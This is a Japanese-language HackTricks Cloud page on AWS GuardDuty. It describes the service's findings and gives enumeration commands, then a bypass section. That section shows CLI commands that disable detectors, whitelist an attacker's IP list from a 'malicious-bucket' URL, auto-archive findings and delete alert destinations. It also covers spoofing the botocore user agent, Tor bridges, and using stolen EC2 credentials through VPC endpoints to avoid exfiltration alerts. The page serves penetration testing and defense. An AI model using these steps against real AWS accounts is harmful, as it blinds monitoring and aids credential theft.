# AWS - GuardDuty Enum

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* If you want to see your **company advertised in HackTricks** or if you want access to the **latest version of the PEASS or download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## GuardDuty

[**ドキュメント**](https://aws.amazon.com/guardduty/features/)によると、GuardDutyは、AWSと業界をリードするサードパーティのソースを組み合わせて、AWS上のワークロードとデータを保護するために、**機械学習、異常検知、ネットワークモニタリング、および悪意のあるファイルの検出**を組み合わせています。 GuardDutyは、AWS CloudTrailイベントログ、Amazon Virtual Private Cloud（VPC）フローログ、Amazon Elastic Kubernetes Service（EKS）の監査およびシステムレベルのログ、およびDNSクエリログなど、複数のAWSデータソース全体で数十億のイベントを分析することができます。

Amazon GuardDutyは、アカウント内の**異常なアクティビティを特定**し、そのアクティビティの**セキュリティの関連性**を分析し、それが呼び出された**コンテキスト**を提供します。これにより、対応者はさらなる調査に時間を費やす必要があるかどうかを判断することができます。

アラートはGuardDutyコンソール（90日）およびCloudWatchイベントに表示されます。

{% hint style="warning" %}
ユーザーがGuardDutyを**無効にする**と、AWS環境の監視が停止し、新しい調査結果は生成されません。また、**既存の調査結果も失われます**。\
停止するだけの場合は、既存の調査結果は残ります。
{% endhint %}

### 調査結果の例

* **偵察**: 攻撃者による偵察を示唆するアクティビティ、例えば**異常なAPIアクティビティ**、不審なデータベースの**ログイン**試行、VPC内部の**ポートスキャン**、異常なログインリクエストパターン、または既知の悪意のあるIPからのポートプロービングなど。
* **インスタンスの侵害**: インスタンスの侵害を示すアクティビティ、例えば**仮想通貨のマイニング、バックドアのコマンド制御（C\&C）**アクティビティ、ドメイン生成アルゴリズム（DGA）を使用したマルウェア、アウトバウンドのサービス拒否アクティビティ、異常に**高いネットワーク**トラフィック量、異常なネットワークプロトコル、既知の悪意のあるIPとのアウトバウンドインスタンス通信、外部IPアドレスが使用する一時的なAmazon EC2資格情報、およびDNSを使用したデータの外部への持ち出し。
* **アカウントの侵害**: アカウントの侵害を示す一般的なパターンには、異常な地理位置や匿名化プロキシからのAPI呼び出し、AWS CloudTrailのロギングを無効にしようとする試み、アカウントのパスワードポリシーを弱める変更、異常なインスタンスまたはインフラストラクチャの起動、異常なリージョンでのインフラストラクチャの展開、資格情報の盗難、不審なデータベースのログインアクティビティ、および既知の悪意のあるIPアドレスからのAPI呼び出しなどがあります。
* **バケットの侵害**: バケットの侵害を示すアクティビティ、例えば資格情報の誤用を示す不審なデータアクセスパターン、リモートホストからの異常なAmazon S3 APIアクティビティ、既知の悪意のあるIPアドレスからの不正なS3アクセス、およびバケットへのデータの取得を目的としたAPI呼び出し（以前にバケットにアクセスした履歴がないユーザーまたは異常な場所から呼び出された）などがあります。 Amazon GuardDutyは、すべてのAmazon S3バケット全体での不審なアクティビティを検出するために、AWS CloudTrail S3データイベント（GetObject、ListObjects、DeleteObjectなど）を継続的に監視および分析します。

<details>

<summary>Finding Information</summary>

Finding summary:

* Finding type
* Severity: 7-8.9 High, 4-6.9 Medium, 01-3.9 Low
* Region
* Account ID
* Resource ID
* Time of detection
* Which threat list was used

The body has this information:

* Resource affected
* Action
* Actor: Ip address, port and domain
* Additional Information

</details>

### すべての調査結果

GuardDutyのすべての調査結果のリストにアクセスするには、[https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_finding-types-active.html](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_finding-types-active.html)にアクセスしてください。

### マルチアカウント

#### 招待による方法

他のアカウントを異なるAWS GuardDutyアカウントに**招待**することで、**すべてのアカウントが同じGuardDutyから監視**されるようにすることができます。マスターアカウントはメンバーアカウントを招待し、その後、メンバーアカウントの代表者が招待を受け入れる必要があります。

#### 組織を介した方法

組織内の任意のアカウントを**GuardDutyの委任管理者**に指定することができます。組織の管理アカウントのみが委任管理者を指定できます。

委任管理者として指定されたアカウントは、GuardDutyの管理者アカウントとなり、指定されたAWSリージョンでGuardDutyが自動的に有効になり、またそのリージョン内のすべてのアカウントのGuardDutyを有効にし、管理する権限を持ちます。組織内の他のアカウントは、この委任管理者アカウントに関連付けられたGuardDutyメンバーアカウントとして表示および追加することができます。

## 列挙

{% code overflow="wrap" %}
```bash
# Get Org config
aws guardduty list-organization-admin-accounts #Get Delegated Administrator
aws guardduty describe-organization-configuration --detector-id <id>

# Check external invitations
aws guardduty list-invitations
aws guardduty get-invitations-count

# Detector Information
aws guardduty list-detectors # 1 detector per account with GuardDuty
aws guardduty get-detector --detector-id <id> # Get detector info
aws guardduty get-master-account --detector-id <id>

# Get filters
aws guardduty list-filters --detector-id <id> # Check filters
aws guardduty get-filter --detector-id <id> --filter-name <name>

# Findings
aws guardduty list-findings --detector-id <id> # List findings
aws guardduty get-findings --detector-id <id> --finding-ids <id> # Get details about the finding
aws guardduty get-findings-statistics --detector-id <id> --finding-statistic-types <types>

# Get trusted IP addresses
aws guardduty list-ip-sets --detector-id <id>
aws guardduty get-ip-set --detector-id <id>

# Member accounts of the current AWS GuardDuty master account
aws guardduty list-members --detector-id <id>
aws guardduty get-members --detector-id <id> --account-ids <id>
aws guardduty get-member-detectors --detector-id <id> --account-ids <id>

# Continuously export its findings to an Amazon S3 bucket
aws guardduty list-publishing-destinations --detector-id <id>

# Intelligence sets that you have uploaded to GuardDuty
aws guardduty list-threat-intel-sets --detector-id <id>
aws guardduty get-threat-intel-set --detector-id <id> --threat-intel-set-id <id>
```
{% endcode %}

## GuardDutyバイパス

### 一般的なガイダンス

使用する資格情報の動作についてできるだけ多くの情報を把握しましょう：

* 使用される回数
* 場所
* ユーザーエージェント/サービス（awscli、webconsole、lambdaなどから使用される可能性があります）
* 定期的に使用される権限

この情報を元に、アクセスを使用するために可能な限り同じシナリオを再現します：

* **ユーザーまたはユーザーによってアクセスされるロール**の場合、同じ時間帯、同じ地理的位置（可能であれば同じISPおよびIP）から使用してみてください
* **サービスによって使用されるロール**の場合、同じリージョンで同じサービスを作成し、同じ時間帯にそこから使用してください
* 常にこのプリンシパルが使用した**同じ権限**を使用しようとしてください
* 他の権限を使用する必要がある場合や権限を悪用する場合（たとえば、100万のクラウドトレイルログファイルをダウンロードする場合）は、AWSとの相互作用を**最小限に抑えて**ゆっくりと行ってください（awscliは書き込みAPIの前に複数の読み取りAPIを呼び出すことがあります）

### GuardDutyの変更

#### `guardduty:ListDetectors`、`guardduty:UpdateDetector`

これらの権限を使用すると、アラートのトリガーを回避するためにGuardDutyを無効にすることができます。
```bash
# Disabling the detector
aws guardduty update-detector \
--detector-id <detector-id> \
--no-enable

# Removing s3 as a log source
aws guardduty update-detector \
--detector-id <detector-id> \
--data-sources S3Logs={Enable=false}

# Increase finding update time to 6 hours
aws guardduty update-detector \
--detector-id <detector-id> \
--finding-publishing-frequency SIX_HOURS
```
#### `guardduty:ListDetectors`, `guardduty:ListIPSet`, `iam:PutRolePolicy`, (`guardduty:CreateIPSet`|`guardduty:UpdateIPSet`)

攻撃者は、GuardDutyの[信頼されたIPリスト](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_upload-lists.html)を作成または更新することができます。その中には、**自分自身のIPアドレスも含まれます**。信頼されたIPリストに含まれるIPアドレスは、CloudtrailやVPCフローログのアラートが発生しません。

{% hint style="info" %}
DNSの検出結果は、信頼されたIPリストの対象外です。
{% endhint %}
```bash
aws guardduty update-ip-set \
--detector-id <detector-id> \
--ip-set-id 24adjigdk34290840348exampleiplist \
--location https://malicious-bucket.s3-us-east-1.amazonaws.com/customiplist.csv \
--activate
```
{% hint style="info" %}
必要なステルスレベルに応じて、ファイルはターゲットアカウントのs3バケットにアップロードされるか、攻撃者が制御するアカウントにアップロードされることがあります。
{% endhint %}

#### `guardduty:CreateFilter`

新しく作成されたGuardDutyの調査結果は、[抑制ルール](https://docs.aws.amazon.com/guardduty/latest/ug/findings\_suppression-rule.html)を介して自動的にアーカイブされることがあります。攻撃者は、生成される可能性のある調査結果を自動的にアーカイブするために、[フィルタ](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_filter-findings.html)を使用することができます。

フィルタは、[CreateFilter API](https://docs.aws.amazon.com/guardduty/latest/APIReference/API\_CreateFilter.html)を使用して作成することができます。
```bash
aws guardduty create-filter \
--action ARCHIVE \
--detector-id <detector-id> \
--name yourfiltername \
--finding-criteria file://criteria.json
```
#### `guardduty:DeletePublishingDestination`

攻撃者は、アラートの宛先を[削除すること](https://docs.aws.amazon.com/cli/latest/reference/guardduty/delete-publishing-destination.html)によって、アラートの無効化を行うことができます。
```bash
aws guardduty delete-publishing-destination \
--detector-id <detector-id> \
--destination-id def456
```
{% hint style="danger" %}
この公開先を削除しても、GuardDutyコンソール内の調査結果の生成や表示には影響しません。GuardDutyは引き続きAWS環境でイベントを分析し、不審または予期しない動作を特定し、調査結果を生成します。
{% endhint %}

### 特定の調査結果の回避

#### ペンテストの調査結果

OSのGuardDutyは、一般的なペネトレーションテストツールからのAWS APIリクエストを検出し、[ペンテストの調査結果](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_finding-types-iam.html#pentest-iam-kalilinux)をトリガーします。\
APIリクエストで渡される**ユーザーエージェント名**によって検出されます。\
したがって、攻撃を検出されないようにするには、**ユーザーエージェントを変更**することが可能です。

Ubuntu、Mac、またはWindowsなどのOSを使用すると、このアラートがトリガーされなくなります。

これを防ぐためには、`botocore`パッケージ内の`session.py`スクリプトを検索します。Kali Linuxでは、`/usr/local/lib/python3.7/dist-packages/botocore/session.py`にあります。

[456行目](https://github.com/boto/botocore/blob/7de36c07ecec503f588ac27658b1795e83b67b75/botocore/session.py#L456)付近に`platform.system()`と`platform.release()`が表示されます。これを、[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/user\_agents.txt)にあるような**正当なユーザーエージェント文字列で置き換え**ます。

#### Torクライアントの調査結果

{% hint style="success" %}
これを回避する最も簡単な方法は、AWSへの接続に**Torを使用しないことです**（クレデンシャルが侵害されたシナリオをシミュレートし、ステルス性を保ちたい場合、なぜTorを使用する必要があるのでしょうか？）
{% endhint %}

**Tor**から接続すると、**Guarduty**はアラート[**UnauthorizedAccess:EC2/TorClient**](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_finding-types-ec2.html#unauthorizedaccess-ec2-torclient)**を設定します**。

Guardutyは、[Torノードの公開リスト](https://metrics.torproject.org/exonerator.html)によってこれを検出します。

Torを介して接続する必要がある場合は、[**Bridges**](https://community.torproject.org/relay/types-of-relays/#Bridge)を使用してこれを回避できます。ただし、接続にTorを使用しない方が良いでしょう。

ブリッジを使用するには、[Obfs4](https://gitlab.com/yawning/obfs4) (`apt install tor obfs4proxy`)を使用し、[bridges.torproject.org](https://bridges.torproject.org/options)からブリッジアドレスを取得します。

ここから、次のような内容の`torrc`ファイルを作成します：
```
UseBridges 1
Bridge obfs4 <IP ADDRESS>:<PORT> <FINGERPRINT> cert=<cert_string> iat-mode=0
ClientTransportPlugin obfs4 exec /bin/obfs4proxy
```
`tor -f torrc`を実行すると、ポート9050で通常のsocks5プロキシに接続できます。

#### 資格情報の流出検知

もし、メタデータサービスからEC2の資格情報を盗み出し、それをAWSインフラストラクチャの外で使用する場合、アラート[UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_finding-types-iam.html#unauthorizedaccess-iam-instancecredentialexfiltrationoutsideaws)がトリガーされます。

さらに、盗まれた資格情報を使用するために、独自のEC2インスタンスを使用する場合、アラート[UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty\_finding-types-iam.html#unauthorizedaccess-iam-instancecredentialexfiltrationinsideaws)がトリガーされます。

{% hint style="warning" %}
同じアカウントから別のEC2マシンを侵害した場合、そこで資格情報を使用することができ、アラートは生成されません。
{% endhint %}

ただし、現在、これをバイパスする方法があります - [VPCエンドポイント](https://docs.aws.amazon.com/vpc/latest/privatelink/vpc-endpoints.html)を使用します。VPCエンドポイントを使用すると、GuardDutyのアラートはトリガーされません。つまり、攻撃者としては、「EC2インスタンスからIAMの資格情報を盗み出した場合、VPCエンドポイントを介してトラフィックをルーティングしながら、それらの資格情報を自分自身のEC2インスタンスから使用することができます。これにより、GuardDutyの検出が行われません。」

このプロセスを自動化するために、[**SneakyEndpoints**](https://github.com/Frichetten/SneakyEndpoints)というツールが作成されました。このプロジェクトは、Terraformを使用して攻撃環境を構築します。インターネットアクセスのないプライベートサブネットにEC2インスタンスを作成し、使用するための複数のVPCエンドポイントを作成します。

このアラートをバイパスする別の方法は、盗まれた資格情報を盗まれたマシンと同じマシン、または同じアカウントのマシンで使用することです。

## 参考文献

* [https://hackingthe.cloud/aws/avoiding-detection/guardduty-pentest/](https://hackingthe.cloud/aws/avoiding-detection/guardduty-pentest/)
* [https://hackingthe.cloud/aws/avoiding-detection/guardduty-tor-client/](https://hackingthe.cloud/aws/avoiding-detection/guardduty-tor-client/)
* [https://hackingthe.cloud/aws/avoiding-detection/modify-guardduty-config/](https://hackingthe.cloud/aws/avoiding-detection/modify-guardduty-config/)
* [https://hackingthe.cloud/aws/avoiding-detection/steal-keys-undetected/](https://hackingthe.cloud/aws/avoiding-detection/steal-keys-undetected/)

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* もし、**HackTricksで会社を宣伝したい**場合や、**PEASSの最新バージョンにアクセスしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)を手に入れましょう。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)をフォローしましょう。
* **HackTricks**と**HackTricks Cloud**のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有しましょう。

</details>
